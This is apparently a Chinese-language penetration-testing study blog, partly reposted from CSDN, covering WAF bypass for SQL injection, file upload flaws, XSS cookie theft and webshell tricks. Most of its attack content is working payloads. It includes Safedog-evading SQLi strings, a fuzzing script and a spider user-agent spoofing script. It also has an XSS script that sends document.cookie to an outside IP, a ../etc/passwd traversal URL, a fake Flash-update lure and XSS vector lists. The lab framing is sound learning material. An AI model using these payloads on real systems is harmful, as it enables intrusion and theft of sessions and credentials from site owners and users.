<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1633665522600.png" alt="" loading="lazy"></figure>
<p>WAF部署-安全狗，宝塔等waf搭建部署<br>
不是拦截部分，是拦截database()整体<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665527093.png" alt="" loading="lazy"><br>
绕过思路：拆分<br>
Mysql特有注释符<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665531452.png" alt="" loading="lazy"><br>
GET提交方式拦截，union select联合查询被拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665534655.png" alt="" loading="lazy"></p>
<pre><code>在mysql的语法中，有三种注释方法：--
和#（单行注释）和 /* */（多行注释）如果在/*后加惊叹号!意为/* */里的语句将被执行
在mysql中 /*! ....*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/*!....*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。如下语句/*!50001 select * from test */;这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633665539620.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633665544783.png" alt="" loading="lazy"></p>
<p>phostudy+safedog安装找不到服务解决<br>
市面上常见的waf产品列表分析-wafw00f<br>
部分bypass sqlinject payload</p>
<pre><code>id=1 union/*%00*/%23a%0a/*!/*!select 1,2,3*/;%23
id=1 union/*%00*/%23a%0a/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*?%201,2,3%23
id=-1%20union%20/*!44509select*?%201,%23x%0A/*!database*?(),3%23

id=1?**&amp;id=-1%20union%20select%201,2,3%23*/

id=-1 %20union%20all%23%0a%20select%201,2,3%23
-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
</code></pre>
<p>市面上常见的waf产品列表 - wafw00f<br>
阿里云盾，安全狗，阿里云盾<br>
遇到WAF先手测，工具一扫就会封IP。<br>
测试绕过就是研究哪方面没有进行过滤</p>
<p>提交方式绕过WAF，前提支持各种方式的接受</p>
<p>（等价函数，特殊函数）：既需要绕过匹配规则，还要不干扰语句的运行结果。</p>
<p>反序列化的格式进行绕过，注释符混用</p>
<p>%0a换行  %23注释#<br>
部分bypass sqlinject payload<br>
特殊符号，换行绕狗子<br>
id = 1 union %23a%0A select 1,2,3 #<br>
匹配到union然后注释，安全认为句子结束，  union a select 狗子不会拦截<br>
union #a                         写#屏蔽a，换行让union select执行<br>
select 1,2,3 #</p>
<pre><code>  注释符混用，参数污染绕狗子
		

		参数污染只接受后面的，?id=1/**&amp;id=-1 unio select 1,2,3 #*/              /***/ SQL里面的注释符
			1/**&amp;id=-1 unio select 1,2,3 #*/        狗子接收的
			-1 unio select 1,2,3 #*/       执行的语句  （内联注释）
			狗子匹配第一条，其中的注释符号起到注释作用，正常情况没法执行，安全狗直接忽略，
			参数污染导致的真实数据是执行的语句，能够正常执行SQL语句
</code></pre>
<p>fuzz模糊测试，类似爆破密码。某个点生成字典，不断测试。写好脚本和字典批量化进行测试</p>
<pre><code>	import request
	import time
	
	
	url = 'http://1.1.1.1/sqli-labs/less2/?id=1'
	for sqlin in open('uniobselect.txt')
		urls = url + sqlin
		result = requests.get(urls).text
		if (result.find('safedog')==-1):
			print(sqlin)
		time.sleep(-1)
</code></pre>
<p>堆叠注入详解：https://www.cnblogs.com/backlion/p/9721687.html</p>
<p>应用层<br>
大小写/关键字替换<br>
id=1 UnIoN/<strong>/SeLeCT 1,user()<br>
hex() bin() 等价于ascii<br>
sleep()等价于benchmark()<br>
Mid()substring() 等价于 substr()<br>
@@user() 等价于User()<br>
@@version等价于version()<br>
各种编码：<br>
大小写,URL,hex,%0A等<br>
注释使用：<br>
// --  --+ # /</strong>/ + :%00 /!**/等<br>
再次循环<br>
union==uunionnion<br>
等价替换：<br>
user()=@@user() and=&amp; or=| ascii=hex等<br>
参数污染：<br>
?id=1&amp;id=2&amp;id=3<br>
编码及解码：<br>
s-&gt;%73-&gt;%25%37%33<br>
更改请求提交方式：<br>
GET,POST,COOKIE<br>
POST-&gt;multipart/from-data</p>
<pre><code>中间件参数污染
</code></pre>
<p>数据库特性：<br>
1.mysql技巧</p>
<pre><code>	（1）mysql注释有三种，#，/*...*/,-- ... （--后加空格）
	 （2）空格符：0x9a,0x0a-0x0d,0x20,0xa0
	 (3)特殊符号 0a%换行符
		可结合注释符使用 %23%0a，%2d%2d%0a
	 （4）内联注释
		/*! union12345select*/ 1,user()   //数字范围1000-50540
	  （5）mysql黑语法
		 select {x username} from {x11 test.admin};
</code></pre>
<p>2.sqlsever</p>
<pre><code>	 (1)用来注释掉后查询的其余部分
		/*   c语言风格注释
		-- sql注释
		；00%空字节
	  (2)空白符：[0x01-0x20]
	 (3)特殊符号：%3a  冒号
		id = 1 union:select 1,2 from:admin
	(4)函数变型：如db_name [空白字符]（）
</code></pre>
<p>3.oracle技巧</p>
<pre><code>(1) 注释符：--，/**/
(2) 空白字符：[0x00,0x09,0x0a-0x0d,0x20]

4.配合fuzz
select * from admin where id=1 [位置一] union [位置二] select [位置三] 1,2，db_name() [位置四] from [位置五] admin
</code></pre>
<p>逻辑层<br>
（1）云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护<br>
（2）当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass，<br>
（3）http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护<br>
（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass<br>
比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns<br>
白名单<br>
方式一：ip白名单</p>
<pre><code>		从网络层获取来的ip，是无法伪造的，如果获取客户端的ip，这样就可能存在伪造ip绕过的情况。
		
		测试方法：
			修改http的header来bypass waf
			x-forwarded-for
			x-remote-ip
			x-originating-ip
			x-remote-addr
			x-real-ip
</code></pre>
<p>方式二：静态资源</p>
<pre><code>			特定的后缀资源静态请求，常见的静态文件，（.js  .jpg  .swf  .css 等），类似白名单机制，
			waf为了检测效率，不去检测这样一些静态文件后缀的请求。
</code></pre>
<p>方式三：url白名单</p>
<pre><code>			为了防止误拦截，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在的白名单的字符，就作为白名单不检测。
</code></pre>
<p>方式四：爬虫白名单</p>
<pre><code>			部分waf对爬虫结果会忽略，waf如果识别出了搜索引擎来爬虫，waf就会放行
		
				import json
				import request
				
				url = 'http://1.1.1.1:8080'
				head={
					'user-agent':'mozilla/5.0(compatible;badiduspider-render/2.0;)'
				}
				for data in open(&quot;php.txt&quot;):
					data = data.replace('\n','')
					urls=url+data
					code=requests.get(urls,headers=head).status_code
					print(urls+'|'+str(code))    
</code></pre>
<h1 id="2021-10-09">2021-10-09</h1>
<h1 id="sql注入之sqlmap绕过waf">SQL注入之SQLMAP绕过WAF</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633745600331.png" alt="" loading="lazy"><br>
<strong>方式一：IP白名单</strong><br>
通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。<br>
从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。<br>
测试方法：修改http的header来by pass waf<br>
X-forwarded-for<br>
X-remote-IP<br>
X-remote-addr<br>
X-Real-IP</p>
<p><strong>方式二：静态资源</strong><br>
特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。<br>
http://10.9.9.201/sql.php?id=1<br>
http://10.9.9.201/sql.php/1.js?id=1<br>
备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745608077.png" alt="" loading="lazy"><br>
<strong>方式三：url白名单</strong><br>
为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：<br>
http://10.9.9.201/sql.php/admin/php?id=1<br>
http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd<br>
http://10.9.9.201/../../../manage/../sql.asp?id=2<br>
waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&amp;b=../etc/passwd绕过防御规则。</p>
<p><strong>方式四：爬虫白名单</strong><br>
部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>
1.根据UserAgent<br>
2.通过行为来判断<br>
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。<br>
User Agent Switcher (firefox 附加组件)，下载地址：<br>
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/<br>
伪造成百度爬虫<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745612766.png" alt="" loading="lazy"><br>
知识点<br>
市面上常见的 waf 产品列表分析-wafw00f<br>
​ 阿里云盾，安全狗，宝塔</p>
<p>部分 bypass sqlinject payload<br>
原理：</p>
<pre><code>?id= 1 union %23a%0A select 1,2,3 
</code></pre>
<p>其实是<br>
union #a                         //写#闭合a，%0A换行让union select执行<br>
select 1,2,3</p>
<p>安全狗匹配到union接着注释，安全狗认为句子结束<br>
为防止安全狗继续读取下去，<strong>加上a来干扰</strong>，从而达到了绕过思路<br>
<strong>union a select 狗子不会拦截</strong></p>
<pre><code>id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23

id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*/%201,2,3%23

id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23id=1/**&amp;id=-1%20union%20select%201,2,3%23*/

id=-1 %20union%20all%23%0a%20select%201,2,3%23

-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23

id=-1 union /*//--/*/     /*!--+/*%0aselect/*!1,2,3*/  --+
</code></pre>
<p>Http参数污染（https://www.cnblogs.com/xishaonian/p/6209441.html）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633745725334.png" alt="" loading="lazy"><br>
参数污染举例及原理：</p>
<pre><code>?id=1/**&amp;id=-1 union select 1,2,3 #*/ 
</code></pre>
<p>安全狗接受的</p>
<pre><code>1/**&amp;id=-1 union select 1,2,3 #*/        
</code></pre>
<p>网站接受的（apache中get污染特性https://blog.csdn.net/weixin_43872099/article/details/104926292）</p>
<pre><code>-1 union select 1,2,3 #*/       执行的语句  
</code></pre>
<p>apche接受的是上面这个语句，#将后面的都注释掉了<br>
安全狗接受的语句中有注释符号，起到注释作用，正常情况没法执行，安全狗直接忽略。</p>
<p>主要是利用参数污染来导致网站和安全狗接受数据的不一致性，实现绕过的操作</p>
<pre><code>id=1%23a%&amp;id=-1%20union%20select%201,2,3%23
</code></pre>
<p>演示案例<br>
WAF 部署-安全狗,宝塔等 waf 搭建部署</p>
<p>简要讲解安全狗,宝塔等防护 waf 策略规则</p>
<p>简要演示安全狗 bypass sqlinject 防护规则（以sqli-labs/Less-2为例子）</p>
<p>在安全狗开启的情况下，我们对其进行注入，发现被拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746157483.png" alt="" loading="lazy"></p>
<p>在这里，我们尝试改变提交方式。尝试用Post方法进行，发现没被拦截，但网页显示不正常，我们可以知道网站不允许进行post方式传值<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746161744.png" alt="" loading="lazy"></p>
<p>我们对源代码进行修改，将提交数据方式改为request方式，让它也能够通过post接受数据，发现能够可以正常注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746174743.png" alt="" loading="lazy"></p>
<p>​ 这种情况说明提交方式绕过WAF，前提是网站支持各种方式的接受（如request），我们利用post和get都可以提交，get有防护但是post没有防护的话，我们可以转化提交方式进行注入操作</p>
<p>接着进行注入操作，发现当我们查询数据库名的时候，又被拦截了，说明安全狗拦截不仅是一方面而已<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746179034.png" alt="" loading="lazy"></p>
<p>通过查询安全狗的防护措施，我们可以发现有对应的规则进行防护<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746182574.png" alt="" loading="lazy"></p>
<p>这时候我们发现即使更改提交方式还是被拦截，接下来我们就要对数据进行处理，对数据进行变异操作后再进行注入，我们尝试使用特殊符号（其中之一）对数据进行处理</p>
<p>绕过的关键点:绕过匹配规则，同时不干扰语句的正常执行</p>
<p>我们将database（）改成<code>database/**/()</code>，你会发现我们绕过了，成功获取到数据库名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746189211.png" alt="" loading="lazy"></p>
<p>我们对源代码再进行修改，将提交数据方式改回get方式，需要注意到的是安全狗中get方式拦截规则更多，用相同的语句进行注入，被拦截了（查询拦截规则＋自己验证知道，union select联合查询这个点触发规则被拦截了）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746193968.png" alt="" loading="lazy"></p>
<p>绕过思路主要是让union和select这个不在一起即可，那我们进行特殊符号进行干扰<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746200351.png" alt="" loading="lazy"></p>
<p>实测简易 CMS 头部注入漏洞 Bypass 原理分析</p>
<p>利用安全狗没有检测http头部进行绕过操作（2020年安全狗）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633746204473.png" alt="" loading="lazy"><br>
涉及资源<br>
https://www.cnblogs.com/backlion/p/9721687.html</p>
<p>https://blog.csdn.net/nzjdsds/article/details/93740686</p>
<p>#应用层</p>
<p>大小写/关键字替换<br>
id=1 UnIoN/**/SeLeCT 1,user()<br>
Hex() bin() 等价于 ascii()<br>
Sleep() 等价于 benchmark()<br>
Mid()substring() 等价于 substr()<br>
@@user 等价于 User()<br>
@@Version 等价于 version()</p>
<p>各种编码<br>
大小写，URL，hex，%0A 等</p>
<p>注释使用</p>
<pre><code>// -- --+ # /**/ + :%00 /!**/等
</code></pre>
<p>再次循环<br>
union==uunionnion</p>
<p>等价替换<br>
user()=@@user() and=&amp; or=| ascii=hex 等</p>
<p>参数污染<br>
?id=1&amp;id=2&amp;id=3</p>
<p>编码解码及加密解密<br>
s-&gt;%73-&gt;%25%37%33<br>
hex,unlcode,base64 等</p>
<p>更改请求提交方式<br>
GET POST COOKIE 等<br>
POST-&gt;multipart/form-data</p>
<p>中间件 HPP 参数污染</p>
<p>#数据库特性</p>
<p>1、Mysql 技巧<br>
（1）mysql 注释符有三种：<br>
#、/<em>...</em>/、-- ... (注意--后面有一个空格)<br>
（2）空格符</p>
<pre><code>:[0x09,0x0a-0x0d,0x20,0xa0]
</code></pre>
<p>（3）特殊符号：%a 换行符</p>
<pre><code>可结合注释符使用%23%0a，%2d%2d%0a。 
</code></pre>
<p>（4）内联注释：</p>
<pre><code>/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540
</code></pre>
<p>（5）mysql 黑魔法</p>
<pre><code>select{x username}from {x11 test.admin};
</code></pre>
<p>2、SQL Server 技巧</p>
<pre><code>（1）用来注释掉注射后查询的其余部分：
/* C 语言风格注释
\-- SQL 注释
; 00％ 空字节
（2）空白符：[0x01-0x20]
（3）特殊符号：%3a 冒号
id=1 union:select 1,2 from:admin
（4）函数变形：如 db_name[空白字符]()
</code></pre>
<p>3、Oracle 技巧</p>
<pre><code>（1）注释符：--、/**/
（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]
</code></pre>
<p>4.配合 FUZZ<br>
select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45889197/article/details/119956015</p>
<h1 id="2021-10-10">2021-10-10</h1>
<p>#文件上传之基础及过滤方式</p>
<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1633827971553.png" alt="" loading="lazy"></figure>
<p><strong>什么是文件上传漏洞？</strong><br>
凡是存在文件上传的地方它均有可能存在文件上传漏洞，关于上传文件操作的时候对方代码写的是否完整、是否安全，一旦疏忽了某个地方可能会造成文件上传漏洞。</p>
<p><strong>文件上传漏洞由哪些危害？</strong><br>
文件可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。</p>
<p><strong>文件上传漏洞如何查找及判断？</strong><br>
1.黑盒查找。文件后台、会员中心、文件扫描。<br>
2.白盒查找。通过代码分析到上传漏洞、查找文件上传功能。</p>
<p><strong>文件上传漏洞有哪些需要注意的地方？</strong><br>
对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。</p>
<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1633827978130.png" alt="" loading="lazy"></figure>
<p>演示案例<br>
常规文件上传地址的获取说明</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633827983855.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633827988815.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633827992708.png" alt="" loading="lazy"></p>
<p>不同格式下的文件类型后门测试</p>
<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1633827998391.png" alt="" loading="lazy"></figure>
<p>不要妄想通过一个图片你能带着你的后门来控制网站。什么格式代码就用什么格式去执行。</p>
<figure data-type="image" tabindex="22"><img src="https://jinqipiaopiao.github.io//post-images/1633828020026.png" alt="" loading="lazy"></figure>
<p>配合解析漏洞下的文件类型后门测试</p>
<pre><code>nginx解析漏洞 https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://jinqipiaopiao.github.io//post-images/1633828031381.png" alt="" loading="lazy"></figure>
<p>解析漏洞：对方在解析上的混乱</p>
<figure data-type="image" tabindex="24"><img src="https://jinqipiaopiao.github.io//post-images/1633828037364.png" alt="" loading="lazy"></figure>
<p>本地文件上传漏洞靶场环境搭建测试</p>
<pre><code>https://github.com/c0ny1/upload-labs
</code></pre>
<figure data-type="image" tabindex="25"><img src="https://jinqipiaopiao.github.io//post-images/1633828183368.png" alt="" loading="lazy"></figure>
<p>HP称为后端语言是因为它的代码和你前端执行源代码是不同的。<br>
前端：代码直接在浏览器上执行。(不安全)<br>
后端：发送到对方服务器脚本里面，脚本在去验证去判断。<br>
前端代码过滤，删除这段代码</p>
<figure data-type="image" tabindex="26"><img src="https://jinqipiaopiao.github.io//post-images/1633828188369.png" alt="" loading="lazy"></figure>
<p>某CMS及CVE编号文件上传漏洞测试<br>
上传操作是用JS提交，在浏览器前端完成，所以抓不到包</p>
<figure data-type="image" tabindex="27"><img src="https://jinqipiaopiao.github.io//post-images/1633828192637.png" alt="" loading="lazy"></figure>
<p>改成PHP</p>
<figure data-type="image" tabindex="28"><img src="https://jinqipiaopiao.github.io//post-images/1633828197646.png" alt="" loading="lazy"></figure>
<p>修改uid为3</p>
<figure data-type="image" tabindex="29"><img src="https://jinqipiaopiao.github.io//post-images/1633828201901.png" alt="" loading="lazy"></figure>
<h1 id="2021-10-12">2021-10-12</h1>
<h1 id="订单cookie窃取和shell箱子反杀">订单cookie窃取和shell箱子反杀</h1>
<p><strong>通过提交订单的方式植入xss来获取网站管理员cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040985645.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040989749.png" alt="" loading="lazy"></p>
<p><strong>简单测试</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040993232.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634040996922.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041001569.png" alt="" loading="lazy"></p>
<p><strong>窃取cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041005682.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041010292.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041016364.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041020276.png" alt="" loading="lazy"></p>
<p>https://www.postman.com/downloads/下载postman<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041025740.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041029543.png" alt="" loading="lazy"></p>
<p>本地构造实现xss攻击1<br>
本地服务器端39.96.44.170 文件jieshou.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041038244.png" alt="" loading="lazy"></p>
<pre><code>&lt;script&gt;
new Image().src =
&quot;http://39.96.44.170/jieshou.php?c=&quot; + encodeURI(document.cookie);
&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634041043950.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041048482.png" alt="" loading="lazy"></p>
<p>方法2<br>
<strong>本地加载js脚本</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041053351.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041059246.png" alt="" loading="lazy"></p>
<p><strong>webshell沙箱反杀</strong><br>
就是使用别人的webshell来进行获取服务器shell，但获取shell后webshell存在的恶意代码就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行信息收集，通过大量获取的网站shell来进行贩卖，而使用webshell的人就成打工仔了<br>
反杀的意思就是像上面的窃取cookie道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到反客为主！<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041064099.png" alt="" loading="lazy"></p>
<p>webshell 中的恶意代码<br>
把网站信息发送到指定地址<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041070329.png" alt="" loading="lazy"></p>
<p><strong>成功发送到沙箱</strong></p>
<p><strong>反杀操作</strong><br>
webshell中的恶意代码</p>
<figure data-type="image" tabindex="30"><img src="https://jinqipiaopiao.github.io//post-images/1634041075367.png" alt="" loading="lazy"></figure>
<p><strong>通过访问webshll来植入xss代码窃取cookie</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041081896.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041089713.png" alt="" loading="lazy"></p>
<p><strong>殊不知cooKie已被窃取</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041095673.png" alt="" loading="lazy"></p>
<p><strong>登录沙箱后台</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041100850.png" alt="" loading="lazy"></p>
<p><strong>演示存在后门的大马</strong><br>
通过打开webshell进行抓包测试发现向恶意网站发送信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041105669.png" alt="" loading="lazy"></p>
<p><strong>发送的代码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041111745.png" alt="" loading="lazy"></p>
<p><strong>内容为网站地址和webshell密码</strong></p>
<p><strong>beef结合xss攻击</strong><br>
启动beef<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041118387.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041125054.png" alt="" loading="lazy"></p>
<p><strong>后台管理员查看订单触发xss</strong><br>
成功上线<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041132976.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041142548.png" alt="" loading="lazy"></p>
<p><strong>社工攻击(利用flash更新)</strong><br>
利用模拟flash更新向客户端发送请求，来实现下载后门<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041148881.png" alt="" loading="lazy"><br>
客户端显示<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041152952.png" alt="" loading="lazy"></p>
<p><strong>点击就下载后门</strong><br>
<strong>获取session思路</strong><br>
<strong>因为当访问php探针时就会携带session</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041157643.png" alt="" loading="lazy"></p>
<p>如果能利用xss让管理员页面跳转到phpinfo()页面，通过返回页面源码就能窃取session</p>
<p><strong>利用beef进行页面跳转</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041164166.png" alt="" loading="lazy"></p>
<p><strong>获取页面源码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041175723.png" alt="" loading="lazy"></p>
<p><strong>获取源码中的cookie和session</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634041179842.png" alt="" loading="lazy"></p>
<p>————————————————<br>
版权声明：本文为CSDN博主「是偉臦道长啊」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_54252904/article/details/117134382</p>
<h1 id="2021-10-15">2021-10-15</h1>
<h1 id="web漏洞-xss跨站之代码绕过与httponly绕过">WEB漏洞-XSS跨站之代码绕过与httpOnly绕过</h1>
<p><strong>什么是HTTPonly？</strong><br>
如果您在cookie中设置了httponly属性，那么通过js脚本将无法读取到cookie信息，这样就能有效的防止xss攻击，具体一点的介绍：<br>
（HTTP only是微软对cookie做的扩展，这个主要是解决用户的cookie可能被盗用的问题。<br>
大家都知道当我们去邮箱或者论坛登陆后，服务器会写一些cookie到我们的浏览器，当下次再访问其他页面是，由于浏览器会自动传递cookie，这样就实现了一次登录就可以看到，所有需要登录后才能看到的内容，也就是说，实质上，所有的登陆状态这些都是建立在cookie上的，假设我们登录后的cookie被人获取，那就会有暴露个人信息的危险，当然想一想，其他人怎么可能可以获取客户的cookie呢，那必然是有不怀好意的人的程序在浏览器里面运行，如果是现在满天飞的流氓软件，那没有办法，HTTPonly也不是用来解决这种情况的，它是用来解决浏览器里卖弄javascript访问cookie的问题，一个flash程序在你的浏览器里面运行就可以获取你的cookie</p>
<figure data-type="image" tabindex="31"><img src="https://jinqipiaopiao.github.io//post-images/1634269549791.png" alt="" loading="lazy"></figure>
<p>作用：仅仅是防止通过js脚本读取到cookie信息，虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站，阻止的是获取cookie</p>
<p>对方开启HTTP only你在盗取cookie失败的情况下可以采用其他方案<br>
登录后台权限方式<br>
1.以cookie形式<br>
2.直接账号密码登录：<br>
保存账号密码读取：通过读取他保存在本地的数据（需要xss产生于登录地址，利用表单劫持）</p>
<figure data-type="image" tabindex="32"><img src="https://jinqipiaopiao.github.io//post-images/1634269553582.png" alt="" loading="lazy"></figure>
<p>type，id，name通过查看网站源代码中的登录框表单</p>
<figure data-type="image" tabindex="33"><img src="https://jinqipiaopiao.github.io//post-images/1634269557915.png" alt="" loading="lazy"></figure>
<p>没保存账号密码读取：通过表单（登录框）劫持数据（产生在后台的xss，例如存储型xss留言等）</p>
<figure data-type="image" tabindex="34"><img src="https://jinqipiaopiao.github.io//post-images/1634269561370.png" alt="" loading="lazy"></figure>
<p>劫持原理：抓取数据包另外发送一份跨站平台</p>
<figure data-type="image" tabindex="35"><img src="https://jinqipiaopiao.github.io//post-images/1634269566442.png" alt="" loading="lazy"></figure>
<p>但是如果是https网站的话，数据是进行了ssl加密，获取了数据后也是很难读取到密码账号的，鸡肋方法</p>
<p>手工判断xss跨站漏洞<br>
靶场：xss_labs<br>
常用代码<br>
<strong>echo</strong></p>
<pre><code>echo
&lt;?php echo&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
?&gt;
</code></pre>
<p><strong>img标签</strong></p>
<pre><code>&lt;img src=javascript:alert(&quot;xss&quot;)&gt;
&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;
&lt;img src=&quot;URL&quot; style='Xss:expression(alert(xss));'&gt;
&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
&lt;img src=&quot;x&quot; onerror=eval(&quot;alert('xss')&quot;)&gt;
&lt;img src=x onmouseover=alert('xss')&gt;
</code></pre>
<p><strong>css</strong></p>
<pre><code>&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt;
</code></pre>
<p><strong>href</strong></p>
<pre><code>标准格式
&lt;a href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;
xss利用格式1
&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;
&lt;a href=javascript:eval(alert(1))&gt;aa&lt;/a&gt;
&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss)&quot;&gt;aa&lt;/a&gt;
利用格式2
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;a href=&quot;&quot; onclick=alert(2)&gt;aa&lt;/a&gt;
利用格式3
&lt;a href=&quot;&quot; onclick=eval(alert(1))&gt;aa&lt;/a&gt;
利用格式4
&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt;
</code></pre>
<p><strong>form标签</strong></p>
<pre><code>xss利用方式1
&lt;form action=javascript:alert('xss') method=&quot;get&quot;&gt;
&lt;form action=javascript:alert('xss')&gt;
xss利用方式2
&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;
&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;
&lt;form action=1 onmouseover=alert('xss')&gt;
</code></pre>
<p><strong>input标签</strong></p>
<pre><code>标准格式
&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
1.&lt;input value=&quot;&quot; onclick=alert(1) type=&quot;text&quot;&gt;
